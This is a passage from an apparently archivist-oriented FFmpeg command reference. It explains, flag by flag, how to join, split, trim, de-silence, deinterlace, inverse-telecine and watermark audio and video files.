    <p><label for="join_files">Join (concatenate) two or more files of the same type</label>
    </p><div>
      <h5>Join files together</h5>
      <p><code>ffmpeg -f concat -i mylist.txt -c copy <em>output_file</em></code></p>
      <p>This command takes two or more files of the same file type and joins them together to make a single file. All that the program needs is a text file with a list specifying the files that should be joined. If possible, run the command from the same directory where the files and the text file reside. Otherwise you'll have to use <code>-safe 0</code>, see below for more information. However, it only works properly if the files to be combined have the exact same codec and technical specifications. Be careful, FFmpeg may appear to have successfully joined two video files with different codecs, but may only bring over the audio from the second file or have other weird behaviors. Don’t use this command for joining files with different codecs and technical specs and always preview your resulting video file!</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-f concat</dt><dd>forces ffmpeg to concatenate the files and to keep the same file format</dd>
        <dt>-i <em>mylist.txt</em></dt><dd>path, name and extension of the input file. Per the <a href="https://ffmpeg.org/ffmpeg-formats.html#Options" target="_blank">FFmpeg documentation</a>, it is preferable to specify relative rather than absolute file paths, as allowing absolute file paths may pose a security risk.<br>
        This text file contains the list of files (without their absolute path) to be concatenated and should be formatted as follows:
<pre>  file '<em>first_file.ext</em>'
  file '<em>second_file.ext</em>'
  . . .
  file '<em>last_file.ext</em>'
</pre>
  In the above, <strong>file</strong> is simply the word "file". Straight apostrophes ('like this') rather than curved quotation marks (‘like this’) must be used to enclose the file paths.<br>
  <strong>Note:</strong> If specifying absolute file paths in the .txt file, add <code>-safe 0</code> before the input file.<br>
  e.g.: <code>ffmpeg -f concat -safe 0 -i mylist.txt -c copy <em>output_file</em></code></dd>
        <dt>-c copy</dt><dd>use stream copy mode to re-mux instead of re-encode</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p>For more information, see the <a href="https://trac.ffmpeg.org/wiki/Concatenate" target="_blank">FFmpeg wiki page on concatenating files</a>.</p>
      
    </div>
    <!-- ends Join files of the same type together -->

    <!-- Join files of different types together -->
    <p><label for="join_different_files">Join (concatenate) two or more files of different types</label>
     </p><div>
      <h5>Join files together</h5>
      <p><code>ffmpeg -i input_1.avi -i input_2.mp4 -filter_complex "[0:v:0][0:a:0][1:v:0][1:a:0]concat=n=2:v=1:a=1[video_out][audio_out]" -map "[video_out]" -map "[audio_out]" <em>output_file</em></code></p>
      <p>This command takes two or more files of the different file types and joins them together to make a single file.</p>
      <p>The input files may differ in many respects - container, codec, chroma subsampling scheme, framerate, etc. However, the above command only works properly if the files to be combined have the same dimensions (e.g., 720x576). Also note that if the input files have different framerates, then the output file will be of variable framerate.</p>
      <p>Some aspects of the input files will be normalized: for example, if an input file contains a video track and an audio track that do not have exactly the same duration, the shorter one will be padded. In the case of a shorter video track, the last frame will be repeated in order to cover the missing video; in the case of a shorter audio track, the audio stream will be padded with silence.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_1.ext</em></dt><dd>path, name and extension of the first input file</dd>
        <dt>-i <em>input_2.ext</em></dt><dd>path, name and extension of the second input file</dd>
        <dt>-filter_complex</dt><dd>states that a complex filtergraph will be used</dd>
        <dt>"</dt><dd>quotation mark to start filtergraph</dd>
        <dt>[0:v:0][0:a:0]</dt><dd>selects the first video stream and first audio stream from the first input.<br>
          Each reference to a specific stream is enclosed in square brackets. In the first stream reference, <code>0:v:0</code>, the first zero refers to the first input file, <code>v</code> means video stream, and the second zero indicates that it is the <em>first</em> video stream in the file that should be selected. Likewise, <code>0:a:0</code> means the first audio stream in the first input file.<br>
          As demonstrated above, ffmpeg uses zero-indexing: <code>0</code> means the first input/stream/etc, <code>1</code> means the second input/stream/etc, and <code>4</code> would mean the fifth input/stream/etc.</dd>
        <dt>[1:v:0][1:a:0]</dt><dd>As described above, this means select the first video and audio streams from the second input file.</dd>
        <dt>concat=</dt><dd>starts the <code>concat</code> filter</dd>
        <dt>n=2</dt><dd>states that there are two input files</dd>
        <dt>:</dt><dd>separator</dd>
        <dt>v=1</dt><dd>sets the number of output video streams.<br>
          Note that this must be equal to the number of video streams selected from each segment.</dd>
        <dt>:</dt><dd>separator</dd>
        <dt>a=1</dt><dd>sets the number of output audio streams.<br>
          Note that this must be equal to the number of audio streams selected from each segment.</dd>
        <dt>[video_out]</dt><dd>name of the concatenated output video stream. This is a variable name which you define, so you could call it something different, like “vOut”, “outv”, or “banana”.</dd>
        <dt>[audio_out]</dt><dd>name of the concatenated output audio stream. Again, this is a variable name which you define.</dd>
        <dt>"</dt><dd>quotation mark to end filtergraph</dd>
        <dt>-map "[video_out]"</dt><dd>map the concatenated video stream into the output file by referencing the variable defined above</dd>
        <dt>-map "[audio_out]"</dt><dd>map the concatenated audio stream into the output file by referencing the variable defined above</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p>If no characteristics of the output files are specified, ffmpeg will use the default encodings associated with the given output file type. To specify the characteristics of the output stream(s), add flags after each <code>-map "[out]"</code> part of the command.</p>
      <p>For example, to ensure that the video stream of the output file is visually lossless H.264 with a 4:2:0 chroma subsampling scheme, the command above could be amended to include the following:<br>
        <code>-map "[video_out]" -c:v libx264 -pix_fmt yuv420p -preset veryslow -crf 18</code></p>
      <p>Likewise, to encode the output audio stream as mp3, the command could include the following:<br>
        <code>-map "[audio_out]" -c:a libmp3lame -dither_method triangular -qscale:a 2</code></p>
      <h4>Variation: concatenating files of different resolutions</h4>
      <p>To concatenate files of different resolutions, you need to resize the videos to have matching resolutions prior to concatenation. The most basic way to do this is by using a scale filter and giving the dimensions of the file you wish to match:</p>
      <p><code>-vf scale=1920:1080:flags=lanczos</code></p>
      <p>(The Lanczos scaling algorithm is recommended, as it is slower but better than the default bilinear algorithm).</p>
      <p>The rescaling should be applied just before the point where the streams to be used in the output file are listed. Select the stream you want to rescale, apply the filter, and assign that to a variable name (<code>rescaled_video</code> in the below example). Then you use this variable name in the list of streams to be concatenated.</p>
      <p><code>ffmpeg -i input_1.avi -i input_2.mp4 -filter_complex "[0:v:0] scale=1920:1080:flags=lanczos [rescaled_video], [rescaled_video] [0:a:0] [1:v:0] [1:a:0] concat=n=2:v=1:a=1 [video_out] [audio_out]" -map "[video_out]" -map "[audio_out]" <em>output_file</em></code></p>
      <p>However, this will only have the desired visual output if the inputs have the same aspect ratio. If you wish to concatenate an SD and an HD file, you will also wish to pillarbox the SD file while upscaling. (See the <a href="#SD_HD_2">Convert 4:3 to pillarboxed HD</a> command). The full command would look like this:</p>
      <p><code>ffmpeg -i input_1.avi -i input_2.mp4 -filter_complex "[0:v:0] scale=1440:1080:flags=lanczos, pad=1920:1080:(ow-iw)/2:(oh-ih)/2 [to_hd_video], [to_hd_video] [0:a:0] [1:v:0] [1:a:0] concat=n=2:v=1:a=1 [video_out] [audio_out]" -map "[video_out]" -map "[audio_out]" <em>output_file</em></code></p>
      <p>Here, the first input is an SD file which needs to be upscaled to match the second input, which is 1920x1080. The scale filter enlarges the SD input to the height of the HD frame, keeping the 4:3 aspect ratio; then, the video is pillarboxed within a 1920x1080 frame.</p>
      <h4>Variation: concatenating files of different framerates</h4>
      <p>If the input files have different framerates, then the output file may be of variable framerate. To explicitly obtain an output file of constant framerate, you may wish convert an input (or multiple inputs) to a different framerate prior to concatenation.</p>
      <p>You can speed up or slow down a file using the <code>fps</code> and <code>atempo</code> filters (see also the <a href="#modify_speed">Modify speed</a> command).</p>
      <p>Here's an example of the full command, in which input_1 is 30fps, input_2 is 25fps, and 25fps is the desired output speed.</p>
      <p><code>ffmpeg -i input_1.avi -i input_2.mp4 -filter_complex "[0:v:0] fps=fps=25 [video_to_25fps]; [0:a:0] atempo=(25/30) [audio_to_25fps]; [video_to_25fps] [audio_to_25fps] [1:v:0] [1:a:0] concat=n=2:v=1:a=1 [video_out] [audio_out]" -map "[video_out]" -map "[audio_out]" <em>output_file</em></code></p>
      <p>Note that the <code>fps</code> filter will drop or repeat frames as necessary in order to achieve the desired frame rate - see the FFmpeg <a href="https://ffmpeg.org/ffmpeg-filters.html#fps-1" target="_blank">fps docs</a> for more details.</p>
      <p>For more information, see the <a href="https://trac.ffmpeg.org/wiki/Concatenate#differentcodec" target="_blank">FFmpeg wiki page on concatenating files of different types</a>.</p>
      
    </div>
    <!-- ends Join files of the different types together -->

    <!-- Split file into segments -->
    <p><label for="segment_file">Split one file into several smaller segments</label>
    </p><div>
      <h5>Split file into segments</h5>
      <p><code>ffmpeg -i <em>input_file</em> -c copy -map 0 -f segment -segment_time 60 -reset_timestamps 1 <em>output_file-%03d.mkv</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>Starts the command.</dd>
        <dt>-i <em>input_file</em></dt><dd>Takes in a normal file.</dd>
        <dt>-c copy</dt><dd>Use stream copy mode to re-mux instead of re-encode.</dd>
        <dt>-map 0</dt><dd>tells FFmpeg to map all streams of the input to the output.</dd>
        <dt>-f segment</dt><dd>Use <a href="https://ffmpeg.org/ffmpeg-formats.html#toc-segment_002c-stream_005fsegment_002c-ssegment" target="_blank">segment muxer</a> for generating the output.</dd>
        <dt>-segment_time 60</dt><dd>Set duration of each segment (in seconds). This example creates segments with max. duration of 60s each.</dd>
        <dt>-reset_timestamps 1</dt><dd>Reset timestamps of each segment to 0. Meant to ease the playback of the generated segments.</dd>
        <dt><em>output_file-%03d.mkv</em></dt>
        <dd>
        <p>Path, name and extension of the output file.<br>
          In order to have an incrementing number in each segment filename, FFmpeg supports <a href="http://www.cplusplus.com/reference/cstdio/printf/" target="_blank">printf-style</a> syntax for a counter.</p>
          <p>In this example, '%03d' means: 3-digits, zero-padded<br>
            Examples:</p>
          <ul>
            <li><code>%03d</code>: 000, 001, 002, ... 999</li>
            <li><code>%05d</code>: 00000, 00001, 00002, ... 99999</li>
            <li><code>%d</code>: 0, 1, 2, 3, 4, ... 23, 24, etc. </li>
          </ul>
        </dd>
      </dl>
      
    </div>
    <!-- ends Split file into segments -->

    <!-- Trim -->
    <p><label for="trim">Trim file</label>
    </p><div>
      <h5>Trim a video without re-encoding</h5>
      <p><code>ffmpeg -i <em>input_file</em> -ss 00:02:00 -to 00:55:00 -c copy -map 0 <em>output_file</em></code></p>
      <p>This command allows you to create an excerpt from a file without re-encoding the audiovisual data.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-ss 00:02:00</dt><dd>sets in point at 00:02:00</dd>
        <dt>-to 00:55:00</dt><dd>sets out point at 00:55:00</dd>
        <dt>-c copy</dt><dd>use stream copy mode (no re-encoding)<br>
        </dd><dt>-map 0</dt><dd>tells FFmpeg to map all streams of the input to the output.<br>
        <strong>Note:</strong> watch out when using <code>-ss</code> with <code>-c copy</code> if the source is encoded with an interframe codec (e.g., H.264). Since FFmpeg must split on i-frames, it will seek to the nearest i-frame to begin the stream copy.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p>Variation: trim file by setting duration, by using <code>-t</code> instead of <code>-to</code></p>
      <p><code>ffmpeg -i <em>input_file</em> -ss 00:05:00 -t 10 -c copy <em>output_file</em></code></p>
      <dl>
        <dt>-ss 00:05:00 -t 10</dt><dd>Beginning five minutes into the original video, this command will create a 10-second-long excerpt.</dd>
      </dl>
      <p>Note: In order to keep the original timestamps, without trying to sanitize them, you may add the <code>-copyts</code> option.</p>
      
    </div>
    <!-- ends Trim -->

    <!-- Excerpt from beginning -->
    <p><label for="excerpt_from_start">Create an excerpt, starting from the beginning of the file</label>
    </p><div>
      <h5>Excerpt from beginning</h5>
      <p><code>ffmpeg -i <em>input_file</em> -t <em>5</em> -c copy -map 0 <em>output_file</em></code></p>
      <p>This command captures a certain portion of a file, starting from the beginning and continuing for the amount of time (in seconds) specified in the script. This can be used to create a preview file, or to remove unwanted content from the end of the file. To be more specific, use timecode, such as 00:00:05.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-t <em>5</em></dt><dd>tells FFmpeg to stop copying from the input file after a certain time, and specifies the number of seconds after which to stop copying. In this case, 5 seconds is specified.</dd>
        <dt>-c copy</dt><dd>use stream copy mode to re-mux instead of re-encode</dd>
        <dt>-map 0</dt><dd>tells FFmpeg to map all streams of the input to the output.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Excerpt from beginning -->

    <!-- Excerpt to end -->
    <p><label for="excerpt_to_end">Create a new file with the first five seconds trimmed off the original</label>
    </p><div>
      <h5>Excerpt to end</h5>
      <p><code>ffmpeg -i <em>input_file</em> -ss <em>5</em> -c copy -map 0 <em>output_file</em></code></p>
      <p>This command copies a file starting from a specified time, removing the first few seconds from the output. This can be used to create an excerpt, or remove unwanted content from the beginning of a file.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-ss <em>5</em></dt><dd>tells FFmpeg what timecode in the file to look for to start copying, and specifies the number of seconds into the video that FFmpeg should start copying. To be more specific, you can use timecode such as 00:00:05.</dd>
        <dt>-c copy</dt><dd>use stream copy mode to re-mux instead of re-encode</dd>
        <dt>-map 0</dt><dd>tells FFmpeg to map all streams of the input to the output.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Excerpt to end -->

    <!-- Excerpt from end -->
    <p><label for="excerpt_from_end">Create a new file with the final five seconds of the original</label>
    </p><div>
      <h5>Excerpt from end</h5>
      <p><code>ffmpeg -sseof <em>-5</em> -i <em>input_file</em> -c copy -map 0 <em>output_file</em></code></p>
      <p>This command copies a file starting from a specified time before the end of the file, removing everything before from the output. This can be used to create an excerpt, or extract content from the end of a file (e.g. for extracting the closing credits).</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-sseof <em>-5</em></dt><dd>This parameter must stay before the input file. It tells FFmpeg what timecode in the file to look for to start copying, and specifies the number of seconds from the end of the video that FFmpeg should start copying. The end of the file has index 0 and the minus sign is needed to reference earlier portions. To be more specific, you can use timecode such as -00:00:05. Note that in most file formats it is not possible to seek exactly, so FFmpeg will seek to the closest point before.</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c copy</dt><dd>use stream copy mode to re-mux instead of re-encode</dd>
        <dt>-map 0</dt><dd>tells FFmpeg to map all streams of the input to the output.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Excerpt from end -->

    <!-- Trim start silence -->
    <p><label for="trim_start_silence">Trim silence from beginning of an audio file</label>
    </p><div>
      <h5>Remove silent portion at the beginning of an audio file</h5>
      <p><code>ffmpeg -i <em>input_file</em> -af silenceremove=start_threshold=-57dB:start_duration=1:start_periods=1  -c:a <em>your_codec_choice</em> -ar <em>your_sample_rate_choice</em> <em>output_file</em></code></p>
      <p>This command will automatically remove silence at the beginning of an audio file. The threshold for what qualifies as silence can be changed - this example uses anything under -57 dB, which is a decent level for accounting for analogue hiss.</p>
      <p><strong>Note:</strong> Since this command uses a filter, the audio stream will be re-encoded for the output. If you do not specify a sample rate or codec, this command will use the sample rate from your input and <a href="#codec-defaults">the codec defaults for your output format</a>. Take care that you are getting your intended results!</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file (e.g. input_file.wav)</dd>
        <dt>-af silenceremove</dt><dd>applies the silence remove filter</dd>
        <dt>start_threshold=-57dB</dt><dd>tells the filter the threshold for what to call 'silence' for the purpose of removal. This can be increased or decreased as necessary.</dd>
        <dt>start_duration=1</dt><dd>This tells the filter how much non-silent audio must be detected before it stops trimming. With a value of <code>0</code> the filter would stop after detecting any non-silent audio. A setting of <code>1</code> allows it to continue trimming through short 'pops' such as those caused by engaging the playback device, or the recorded sound of a microphone being plugged in.</dd>
        <dt>start_periods=1</dt><dd>This tells the filter to trim the first example of silence it discovers from the beginning of the file. This value could be increased to remove subsequent silent portions from the file if desired.</dd>
        <dt>-c:a <em>your_codec_choice</em></dt><dd>This tells the filter what codec to use, and must be specified to avoid defaults. If you want 24 bit PCM, your value would be <code>-c:a pcm_s24le</code>.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file (e.g. output_file.wav).</dd>
      </dl>
    </div>
    <!-- ends Trim start silence -->

    <!-- Trim end silence -->
    <p><label for="trim_end_silence">Trim silence from the end of an audio file</label>
    </p><div>
      <h5>Remove silent portion from the end of an audio file</h5>
      <p><code>ffmpeg -i <em>input_file</em> -af areverse,silenceremove=start_threshold=-57dB:start_duration=1:start_periods=1,areverse -c:a <em>your_codec_choice</em> -ar <em>your_sample_rate_choice</em> <em>output_file</em></code></p>
      <p>This command will automatically remove silence at the end of an audio file. Since the <code>silenceremove</code> filter is best at removing silence from the beginning of files, this command used the <code>areverse</code> filter twice to reverse the input, remove silence and then restore correct orientation.</p>
      <p><strong>Note:</strong> Since this command uses a filter, the audio stream will be re-encoded for the output. If you do not specify a sample rate or codec, this command will use the sample rate from your input and <a href="#codec-defaults">the codec defaults for your output format</a>. Take care that you are getting your intended results!</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file (e.g. input_file.wav)</dd>
        <dt>-af areverse,</dt><dd>starts the filter chain with reversing the input</dd>
        <dt>silenceremove</dt><dd>applies the silence remove filter</dd>
        <dt>start_threshold=-57dB</dt><dd>tells the filter the threshold for what to call 'silence' for the purpose of removal. This can be increased or decreased as necessary.</dd>
        <dt>start_duration=1</dt><dd>This tells the filter how much non-silent audio must be detected before it stops trimming. With a value of <code>0</code> the filter would stop after detecting any non-silent audio. A setting of <code>1</code> allows it to continue trimming through short 'pops' such as those caused by engaging the playback device, or the recorded sound of a microphone being plugged in.</dd>
        <dt>start_periods=1</dt><dd>This tells the filter to trim the first example of silence it discovers.</dd>
        <dt>areverse</dt><dd>applies the audio reverse filter again to restore input to correct orientation.</dd>
        <dt>-c:a <em>your_codec_choice</em></dt><dd>This tells the filter what codec to use, and must be specified to avoid defaults. If you want 24 bit PCM, your value would be <code>-c:a pcm_s24le</code>.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file (e.g. output_file.wav).</dd>
      </dl>
    </div>
    <!-- ends Trim end silence -->

    </div>
    <div>
    <h2 id="interlacing">Work with interlaced video</h2>

    <!-- NTSC to H.264 -->
    <p><label for="ntsc_to_h264">Upscaled, pillar-boxed HD H.264 access files from SD NTSC source</label>
    </p><div>
      <h5>Upscaled, Pillar-boxed HD H.264 Access Files from SD NTSC source</h5>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -filter:v "yadif, scale=1440:1080:flags=lanczos, pad=1920:1080:(ow-iw)/2:(oh-ih)/2, format=yuv420p" <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c:v libx264</dt><dd>encodes video stream with libx264 (h264)</dd>
        <dt>-filter:v</dt><dd>a video filter will be used</dd>
        <dt>"</dt><dd>quotation mark to start filtergraph</dd>
        <dt>yadif</dt><dd>deinterlacing filter (‘yet another deinterlacing filter’)<br>
         By default, <a href="https://ffmpeg.org/ffmpeg-filters.html#yadif-1" target="_blank">yadif</a> will output one frame for each frame. Outputting one frame for each <em>field</em> (thereby doubling the frame rate) with <code>yadif=1</code> may produce visually better results.</dd>
        <dt>scale=1440:1080:flags=lanczos</dt><dd>resizes the image to 1440x1080, using the Lanczos scaling algorithm, which is slower but better than the default bilinear algorithm.</dd>
        <dt>pad=1920:1080:(ow-iw)/2:(oh-ih)/2</dt><dd>pads the area around the 4:3 input video to create a 16:9 output video</dd>
        <dt>format=yuv420p</dt><dd>specifies a pixel format of Y′C<sub>B</sub>C<sub>R</sub> 4:2:0</dd>
        <dt>"</dt><dd>quotation mark to end filtergraph</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p><strong>Note:</strong> the very same scaling filter also downscales a bigger image size into HD.</p>
      
    </div>
    <!-- ends NTSC to H.264 -->

    <!-- Deinterlace video -->
    <p><label for="deinterlace">Deinterlace video</label>
    </p><div>
      <h5>Deinterlace a video</h5>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -vf "yadif,format=yuv420p" <em>output_file</em></code></p>
      <p>This command takes an interlaced input file and outputs a deinterlaced H.264 MP4.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c:v libx264</dt><dd>tells FFmpeg to encode the video stream as H.264</dd>
        <dt>-vf</dt><dd>video filtering will be used (<code>-vf</code> is an alias of <code>-filter:v</code>)</dd>
        <dt>"</dt><dd>start of filtergraph (see below)</dd>
        <dt>yadif</dt><dd>deinterlacing filter (‘yet another deinterlacing filter’)<br>
        By default, <a href="https://ffmpeg.org/ffmpeg-filters.html#yadif-1" target="_blank">yadif</a> will output one frame for each frame. Outputting one frame for each <em>field</em> (thereby doubling the frame rate) with <code>yadif=1</code> may produce visually better results.</dd>
        <dt>,</dt><dd>separates filters</dd>
        <dt>format=yuv420p</dt><dd>chroma subsampling set to 4:2:0<br>
        By default, <code>libx264</code> will use a chroma subsampling scheme that is the closest match to that of the input. This can result in Y′C<sub>B</sub>C<sub>R</sub> 4:2:0, 4:2:2, or 4:4:4 chroma subsampling. QuickTime and most other non-FFmpeg based players can’t decode H.264 files that are not 4:2:0, therefore it’s advisable to specify 4:2:0 chroma subsampling.</dd>
        <dt>"</dt><dd>end of filtergraph</dd>
        <dt><em>output file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p><code>"yadif,format=yuv420p"</code> is an FFmpeg <a href="https://trac.ffmpeg.org/wiki/FilteringGuide#FiltergraphChainFilterrelationship" target="_blank">filtergraph</a>. Here the filtergraph is made up of one filter chain, which is itself made up of the two filters (separated by the comma).<br>
      The enclosing quote marks are necessary when you use spaces within the filtergraph, e.g. <code>-vf "yadif, format=yuv420p"</code>, and are included above as an example of good practice.</p>
      <p><strong>Note:</strong> FFmpeg includes several deinterlacers apart from <a href="https://ffmpeg.org/ffmpeg-filters.html#yadif-1" target="_blank">yadif</a>: <a href="https://ffmpeg.org/ffmpeg-filters.html#bwdif" target="_blank">bwdif</a>, <a href="https://ffmpeg.org/ffmpeg-filters.html#w3fdif" target="_blank">w3fdif</a>, <a href="https://ffmpeg.org/ffmpeg-filters.html#kerndeint" target="_blank">kerndeint</a>, and <a href="https://ffmpeg.org/ffmpeg-filters.html#nnedi" target="_blank">nnedi</a>.</p>
      <p>For more H.264 encoding options, see the latter section of the <a href="#transcode_h264">encode H.264 command</a>.</p>
      <div>
        <h2>Example</h2>
        <p>Before and after deinterlacing:</p>
        <p><img src="https://amiaopensource.github.io/ffmprovisr/img/interlaced_video.png" alt="VLC screenshot of original interlaced video">
        <img src="https://amiaopensource.github.io/ffmprovisr/img/deinterlaced_video.png" alt="VLC screenshot of deinterlaced video">
      </p></div>
      
    </div>
    <!-- ends Deinterlace video -->

    <!-- Inverse telecine -->
    <p><label for="inverse-telecine">Inverse telecine</label>
    </p><div>
      <h5>Inverse telecine a video file</h5>
      <p><code>ffmpeg -i <em>input_file</em> -c:v libx264 -vf "fieldmatch,yadif,decimate" <em>output_file</em></code></p>
      <p>The inverse telecine procedure reverses the <a href="https://en.wikipedia.org/wiki/Three-two_pull_down" target="_blank">3:2 pull down</a> process, restoring 29.97fps interlaced video to the 24fps frame rate of the original film source.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-c:v libx264</dt><dd>encode video as H.264</dd>
        <dt>-vf "fieldmatch,yadif,decimate"</dt><dd>applies these three video filters to the input video.<br>
        <a href="https://ffmpeg.org/ffmpeg-filters.html#fieldmatch" target="_blank">Fieldmatch</a> is a field matching filter for inverse telecine - it reconstructs the progressive frames from a telecined stream.<br>
        <a href="https://ffmpeg.org/ffmpeg-filters.html#yadif-1" target="_blank">Yadif</a> (‘yet another deinterlacing filter’) deinterlaces the video. (Note that FFmpeg also includes several other deinterlacers).<br>
        <a href="https://ffmpeg.org/ffmpeg-filters.html#decimate-1" target="_blank">Decimate</a> deletes duplicated frames.</dd>
        <dt><em>output file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p><code>"fieldmatch,yadif,decimate"</code> is an FFmpeg <a href="https://trac.ffmpeg.org/wiki/FilteringGuide#FiltergraphChainFilterrelationship" target="_blank">filtergraph</a>. Here the filtergraph is made up of one filter chain, which is itself made up of the three filters (separated by commas).<br>
      The enclosing quote marks are necessary when you use spaces within the filtergraph, e.g. <code>-vf "fieldmatch, yadif, decimate"</code>, and are included above as an example of good practice.</p>
      <p>Note that if applying an inverse telecine procedure to a 29.97i file, the output framerate will actually be 23.976fps.</p>
      <p>This command can also be used to restore other framerates.</p>
      <div>
        <h2>Example</h2>
        <p>Before and after inverse telecine:</p>
        <p><img src="https://amiaopensource.github.io/ffmprovisr/img/ivtc_originalvideo.gif" alt="GIF of original video">
        <img src="https://amiaopensource.github.io/ffmprovisr/img/ivtc_result.gif" alt="GIF of video after inverse telecine">
      </p></div>
      
    </div>
    <!-- ends Inverse telecine -->

    <!-- Set field order -->
    <p><label for="set_field_order">Set field order for interlaced video</label>
    </p><div>
      <h5>Change field order of an interlaced video</h5>
      <p><code>ffmpeg -i <em>input_file</em> -c:v <em>video_codec</em> -filter:v setfield=tff <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-filter:v setfield=tff</dt><dd>Sets the field order to top field first. Use <code>setfield=bff</code> for bottom field first.</dd>
        <dt>-c:v <em>video_codec</em></dt><dd>As a video filter is used, it is not possible to use <code>-c copy</code>. The video must be re-encoded with whatever video codec is chosen, e.g. <code>ffv1</code>, <code>v210</code> or <code>prores</code>.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Set field order -->

    <!-- Check interlacement -->
    <p><label for="check_interlacement">Identify interlacement patterns in a video file</label>
    </p><div>
      <h5>Check video file interlacement patterns</h5>
      <p><code>ffmpeg -i <em>input file</em> -filter:v idet -f null -</code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-filter:v idet</dt><dd>This calls the <a href="https://ffmpeg.org/ffmpeg-filters.html#idet" target="_blank">idet (detect video interlacing type) filter</a>.</dd>
        <dt>-f null</dt><dd>Video is decoded with the <code>null</code> muxer. This allows video decoding without creating an output file.</dd>
        <dt>-</dt><dd>FFmpeg syntax requires a specified output, and <code>-</code> is just a place holder. No file is actually created.</dd>
      </dl>
      
    </div>
    <!-- ends Check interlacement -->

    </div>
    <div>
    <h2 id="overlay">Overlay timecode or text</h2>

    <!-- Text Watermark -->
    <p><label for="text_watermark">Create opaque centered text watermark</label>
    </p><div>
      <h5>Create centered, transparent text watermark</h5>
      <p>E.g For creating access copies with your institutions name</p>
      <p><code>ffmpeg -i <em>input_file</em> -vf drawtext="fontfile=<em>font_path</em>:fontsize=<em>font_size</em>:text=<em>watermark_text</em>:fontcolor=<em>font_color</em>:alpha=0.4:x=(w-text_w)/2:y=(h-text_h)/2" <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-vf drawtext=</dt><dd>This calls the drawtext filter with the following options:
        <dl>
          <dt>fontfile=<em>font_path</em></dt><dd>Set path to font. For example in macOS: <code>fontfile=/Library/Fonts/AppleGothic.ttf</code></dd>
          <dt>fontsize=<em>font_size</em></dt><dd>Set font size. <code>35</code> is a good starting point for SD. Ideally this value is proportional to video size, for example use ffprobe to acquire video height and divide by 14.</dd>
          <dt>text=<em>watermark_text</em></dt><dd>Set the content of your watermark text. For example: <code>text='FFMPROVISR EXAMPLE TEXT'</code></dd>
          <dt>fontcolor=<em>font_color</em></dt><dd>Set color of font. Can be a text string such as <code>fontcolor=white</code> or a hexadecimal value such as <code>fontcolor=0xFFFFFF</code></dd>
          <dt>alpha=0.4</dt><dd>Set transparency value.</dd>
          <dt>x=(w-text_w)/2:y=(h-text_h)/2</dt><dd>Sets <em>x</em> and <em>y</em> coordinates for the watermark. These relative values will centre your watermark regardless of video dimensions.</dd>
        </dl>
        Note: <code>-vf</code> is a shortcut for <code>-filter:v</code>.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file.</dd>
      </dl>
      
    </div>
    <!-- ends Text watermark -->

    <!-- Transparent Image Watermark -->
    <p><label for="image_watermark">Overlay image watermark on video</label>
    </p><div>
      <h5>Overlay image watermark on video</h5>
      <p><code>ffmpeg -i <em>input_video file</em> -i <em>input_image_file</em> -filter_complex overlay=main_w-overlay_w-5:5 <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_video_file</em></dt><dd>path, name and extension of the input video file</dd>
        <dt>-i <em>input_image_file</em></dt><dd>path, name and extension of the image file</dd>
